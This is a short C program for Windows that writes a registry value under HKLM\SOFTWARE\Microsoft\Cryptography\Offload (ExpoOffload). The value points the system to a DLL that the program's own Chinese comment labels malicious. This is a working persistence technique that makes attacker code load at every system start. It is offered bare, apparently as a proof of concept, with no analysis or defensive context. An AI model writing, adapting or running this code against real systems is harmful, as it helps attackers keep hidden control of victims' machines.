#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  const char* path = "SOFTWARE\\Microsoft\\Cryptography\\Offload";

  //恶意DLL文件
  const char* evil = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.dll";
  LONG res = RegCreateKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)path, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, 0);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"ExpoOffload", 0, REG_SZ, (unsigned char*)evil, strlen(evil));
    RegCloseKey(hkey);
  }

  return 0;
}
